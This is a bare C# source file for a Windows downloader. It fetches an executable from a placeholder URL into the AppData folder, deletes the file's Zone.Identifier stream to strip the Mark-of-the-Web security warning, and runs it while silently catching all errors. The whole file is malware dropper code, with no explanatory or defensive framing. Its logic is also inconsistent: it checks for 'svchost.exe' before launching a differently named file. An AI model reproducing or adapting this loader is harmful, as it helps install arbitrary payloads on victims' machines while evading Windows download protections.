using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Threading;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using Microsoft.Win32;

namespace ConsoleApplication3
{
    class Program
    {

        //ZONEID
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFile(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileA([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string lpFileName);
        //ZONEID^
        static void Main(string[] args)
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                try
                {
                    //
                    //
                    new WebClient().DownloadFile("http://url/file.exe", path + "//" + "nameoffile.exe");
                    if (File.Exists(path + "//" + "svchost.exe") == true)
                    {
                        try
                        {
                            DeleteFileW(path + "//" + "nameoffile.exe" + ":Zone.Identifier");
                        }
                        catch { }
                        Process.Start(path + "//" + "nameoffile.exe");
                    }
                }
                catch { }
            }
            catch { }
        }
    }
}
